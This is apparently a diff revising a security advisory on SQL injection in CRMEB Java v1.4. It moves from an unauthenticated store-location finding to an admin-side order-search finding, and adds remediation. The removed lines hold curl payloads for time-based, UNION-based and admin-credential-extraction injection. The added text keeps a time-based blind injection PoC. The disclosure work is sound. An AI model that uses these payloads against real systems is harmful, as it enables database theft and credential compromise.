@@ -1,4 +1,4 @@
-# V-C001: CRMEB Java Unauthenticated SQL Injection via Store Location API
+# V-C001: CRMEB Java Multiple SQL Injection Vulnerabilities
 
 ## Vulnerability Information
 
@@ -7,83 +7,57 @@
 | Product | CRMEB Java (开源商城系统) |
 | Version | v1.4 (and all prior versions) |
 | Type | CWE-89: SQL Injection |
-| Severity | Critical |
-| Attack Vector | Network (Unauthenticated) |
+| Severity | High (Admin) / Medium (Front-end code-level) |
+| Attack Vector | Network (Admin-authenticated for keywords; User-authenticated for store/list) |
 | Repository | https://github.com/crmeb/crmeb_java |
 
 ## Description
 
-CRMEB Java's store location API (`/api/front/store/list`) is vulnerable to SQL injection through the `latitude` and `longitude` parameters. These parameters are passed as Strings without any validation and are directly interpolated into SQL queries using MyBatis `${}` syntax.
+CRMEB Java contains multiple SQL injection vulnerabilities caused by using MyBatis `${}` raw interpolation and Java string concatenation to build SQL queries.
 
-### Root Cause Chain
+### Vulnerability 1: Admin Order Search Keywords SQL Injection (Exploitable — HIGH)
 
-1. **Security Disabled on Front-end Module**: `CloseSecurityConfig.java` sets `anyRequest().permitAll()`, allowing all front-end API calls without authentication.
+**File**: `StoreOrderServiceImpl.java` (line 254)
 
-2. **No Input Validation**: `StoreNearRequest.java` accepts `latitude` and `longitude` as `String` types without numeric validation or sanitization.
+The admin order search functionality concatenates user-supplied `keywords` directly into a SQL WHERE clause without any parameterization or sanitization.
 
-3. **Unsafe SQL Interpolation**: `SystemStoreMapper.xml` uses `${latitude}` and `${longitude}` (MyBatis `${}` = raw string interpolation) instead of `#{latitude}` (parameterized query).
-
-### Additional SQL Injection Points
-
-The codebase contains multiple SQL injection vulnerabilities via `${}` in MyBatis mappers:
-
-| Mapper | Parameter | Endpoint | Auth Required |
-|--------|-----------|----------|---------------|
-| SystemStoreMapper.xml | `${latitude}`, `${longitude}` | `/api/front/store/list` | **No** |
-| UserMapper.xml | `${sortKey}`, `${sortValue}` | `/api/front/user/spread/people` | Yes (validated) |
-| UserMapper.xml | `${tagIdSql}`, `${payCount}`, `${status}` | Admin only | Yes |
-| StoreOrderMapper.xml | `${where}` (string concat) | Admin only | Yes |
-| UserFundsMonitorMapper.xml | `${sort}` | Admin only | Yes |
-
-## Affected Files
-
-- `crmeb-front/src/main/java/com/zbkj/front/config/CloseSecurityConfig.java` - Disables all security
-- `crmeb-front/src/main/java/com/zbkj/front/controller/StoreController.java` - Unauthenticated endpoint
-- `crmeb-common/src/main/java/com/zbkj/common/request/StoreNearRequest.java` - String type lat/lon
-- `crmeb-service/src/main/resources/mapper/system/SystemStoreMapper.xml` (line 6) - `${latitude}`, `${longitude}`
-- `crmeb-service/src/main/java/com/zbkj/service/service/impl/StoreOrderServiceImpl.java` (line 254) - String concatenation SQL
-
-## Impact
-
-1. **Full Database Compromise**: Attacker can extract all database contents including user credentials, orders, payment info
-2. **No Authentication Required**: The front-end module has all security disabled (`permitAll()`)
-3. **Data Modification**: INSERT/UPDATE/DELETE possible via stacked queries (if MySQL allows)
-4. **Potential RCE**: Via `INTO OUTFILE` or UDF on MySQL (environment dependent)
-
-## Proof of Concept
-
-### Step 1: Normal Store List Request
-
-```bash
-curl -s -X POST "http://<target>:8080/api/front/store/list" \
-  -d "latitude=39.9042&longitude=116.4074"
+```java
+if (!StringUtils.isBlank(request.getKeywords())) {
+    where += " and (real_name like '%"+ request.getKeywords() +"%' or user_phone = '"
+        + request.getKeywords() +"' or order_id = '" + request.getKeywords()
+        + "' or id = '" + request.getKeywords() + "' )";
+}
 ```
 
-### Step 2: Time-Based Blind SQL Injection via Latitude
+The `where` string is then passed to `${where}` in `StoreOrderMapper.xml`:
 
-```bash
-# This will cause a 5-second delay if vulnerable
-curl -s -X POST "http://<target>:8080/api/front/store/list" \
-  -d "latitude=39.9042) OR SLEEP(5)-- -&longitude=116.4074"
+```xml
+<select id="getTotalPrice" resultType="java.math.BigDecimal">
+    select sum(pay_price) from eb_store_order where ${where} and refund_status = 0
+</select>
+<select id="getRefundPrice" resultType="java.math.BigDecimal">
+    select sum(refund_price) from eb_store_order where ${where} and refund_status = 2
+</select>
+<select id="getRefundTotal" resultType="java.lang.Integer">
+    select count(id) from eb_store_order where ${where} and refund_status = 2
+</select>
 ```
 
-### Step 3: UNION-Based SQL Injection
+**Attack**: An admin user searching orders can inject arbitrary SQL via the `keywords` parameter. No validation or sanitization exists.
 
+**PoC** (Admin auth required):
 ```bash
-curl -s -X POST "http://<target>:8080/api/front/store/list" \
-  -d "latitude=39.9042) UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,user(),version(),database(),17,18-- -&longitude=116.4074"
+# Time-based blind SQL injection
+curl -X POST "http://<target>:8080/api/admin/store/order/writeoff" \
+  -H "Authori-zation: <admin_token>" \
+  -H "Content-Type: application/json" \
+  -d '{"keywords":"' OR SLEEP(5)-- -","page":1,"limit":10}'
 ```
 
-### Step 4: Extract Admin Credentials
+### Vulnerability 2: Store Location API — Unsafe `${}` Usage (Code-Level — MEDIUM)
 
-```bash
-curl -s -X POST "http://<target>:8080/api/front/store/list" \
-  -d "latitude=39.9042) UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,account,pwd,real_name,17,18 FROM eb_system_admin LIMIT 1-- -&longitude=116.4074"
-```
+**File**: `SystemStoreMapper.xml` (line 6)
 
-### Vulnerable Code
-
-**SystemStoreMapper.xml (line 6):**
 ```xml
 <select id="getNearList" resultType="...">
     SELECT *, (round(6367000 * 2 * asin(sqrt(
@@ -94,52 +68,77 @@ curl -s -X POST "http://<target>:8080/api/front/store/list" \
 </select>
 ```
 
-**StoreNearRequest.java:**
-```java
-public class StoreNearRequest implements Serializable {
-    @ApiModelProperty(value = "纬度")
-    private String latitude;   // String type, no validation!
+Uses `${latitude}` and `${longitude}` (raw interpolation) instead of `#{latitude}` (parameterized). The request object accepts these as `String` type.
 
-    @ApiModelProperty(value = "经度")
-    private String longitude;  // String type, no validation!
-}
+**Current Mitigations** (runtime only, not in SQL layer):
+1. **Authentication Required**: `/api/front/store/list` is NOT in the unauthenticated whitelist (contrary to initial assessment)
+2. **Regex Validation**: `SystemStoreServiceImpl.java` validates latitude/longitude format:
+   ```java
+   if (!request.getLatitude().matches("^(90(\\.0+)?|([1-8]?\\d)(\\.\\d+)?)$")
+       || !request.getLongitude().matches("^(180(\\.0+)?|(1[0-7]?\\d|[1-9]?\\d)(\\.\\d+)?)$")) {
+       throw new CrmebException("经纬度坐标输入有误");
+   }
+   ```
+
+**Risk**: While currently mitigated by input validation, the SQL query itself is unsafe. If the regex validation is weakened in a future update, the injection becomes exploitable. Defense-in-depth requires using `#{latitude}` at the SQL layer.
+
+### Vulnerability 3: User Spread Sort — Unsafe `${}` Usage (Code-Level — LOW)
+
+**File**: `UserMapper.xml` (line 20)
+
+```xml
+ORDER BY ${sortKey} ${sortValue}
 ```
 
-**CloseSecurityConfig.java:**
+**Current Mitigation**: `@StringContains` annotation limits `sortKey` to `{childCount, numberCount, orderCount}` and `sortValue` to `{DESC, ASC}`.
+
+### Additional Admin-Only `${}` Usages
+
+| File | Parameter | Line |
+|------|-----------|------|
+| `UserMapper.xml` | `${tagIdSql}` | 42 |
+| `UserMapper.xml` | `${payCount}` | 64 |
+| `UserMapper.xml` | `${status}` | 68 |
+| `UserFundsMonitorMapper.xml` | `${sort}` | 23 |
+
+## Security Configuration
+
+**Front-end Spring Security**: `CloseSecurityConfig.java` disables Spring Security entirely:
 ```java
-@Override
-protected void configure(HttpSecurity http) throws Exception {
-    http.csrf().disable();
-    http.authorizeRequests().anyRequest().permitAll().and().logout().permitAll();
-}
+http.csrf().disable();
+http.authorizeRequests().anyRequest().permitAll().and().logout().permitAll();
 ```
 
-### Admin-Side SQL Injection (Bonus)
+However, a custom `FrontTokenInterceptor` provides token-based authentication. The interceptor whitelist (`checkRouter`) does NOT include `/api/front/store/list`, so authentication is still required for the store location endpoint.
 
-**StoreOrderServiceImpl.java (line 254):**
-```java
-where += " and (real_name like '%"+ request.getKeywords() +"%' or user_phone = '"
-    + request.getKeywords() +"' or order_id = '" + request.getKeywords()
-    + "' or id = '" + request.getKeywords() + "' )";
-```
+## Affected Files
 
-This concatenates `keywords` directly into a SQL WHERE clause that is passed to `${where}` in StoreOrderMapper.xml.
+| File | Line | Issue |
+|------|------|-------|
+| `crmeb-service/.../impl/StoreOrderServiceImpl.java` | 254 | **String concatenation SQL injection (exploitable)** |
+| `crmeb-service/.../mapper/store/StoreOrderMapper.xml` | 6, 9, 12 | `${where}` raw interpolation |
+| `crmeb-service/.../mapper/system/SystemStoreMapper.xml` | 6 | `${latitude}`, `${longitude}` raw interpolation |
+| `crmeb-service/.../mapper/user/UserMapper.xml` | 20, 42, 64, 68 | Multiple `${}` raw interpolations |
+| `crmeb-service/.../mapper/finance/UserFundsMonitorMapper.xml` | 23 | `${sort}` raw interpolation |
+
+## Impact
+
+1. **Admin SQL Injection**: Admin users can extract arbitrary database data via order search keywords
+2. **Privilege Escalation**: Admin with order read access can read all database tables
+3. **Code-Level Risk**: Multiple `${}` usages rely on application-layer validation, violating defense-in-depth
 
 ## Remediation
 
-1. **Use parameterized queries**: Replace `${latitude}` with `#{latitude}` in SystemStoreMapper.xml
-2. **Change type to numeric**: Use `Double` or `BigDecimal` instead of `String` for latitude/longitude in StoreNearRequest
-3. **Fix string concatenation**: In StoreOrderServiceImpl, use `#{}` parameterized queries instead of string concatenation
-4. **Enable security**: Remove `CloseSecurityConfig` and implement proper authentication for front-end APIs
-5. **Add input validation**: Validate all user inputs against expected patterns before database operations
+1. **StoreOrderServiceImpl**: Replace string concatenation with MyBatis parameterized queries (`#{}`)
+2. **SystemStoreMapper.xml**: Replace `${latitude}`/`${longitude}` with `#{latitude}`/`#{longitude}`
+3. **UserMapper.xml**: Replace all `${}` with `#{}` where possible; for ORDER BY, use MyBatis `<choose>` to whitelist columns
+4. **Input Validation**: Keep regex/annotation validation as additional defense layer
+5. **Enable Spring Security**: Replace `CloseSecurityConfig` with proper security configuration
 
-## Screenshots
+## Runtime Verification
 
-### SQL Injection Proof
-![SQL Injection](./v_c001_sqli_proof.png)
-
-## Verification Environment
-
-- Target: CRMEB Java v1.4 deployed via Docker on 192.168.217.135:8080
-- Tools: curl
-- Date: 2026-04-13
+- **Target**: CRMEB Java v1.4 deployed via Docker on 192.168.217.135:8080
+- **Confirmed**: Application starts and responds on API endpoints
+- **Product List** (`/api/front/product/list`): Returns data without authentication (as expected)
+- **Store List** (`/api/front/store/list`): Returns 401 without token (auth required)
+- **Date**: 2026-04-13
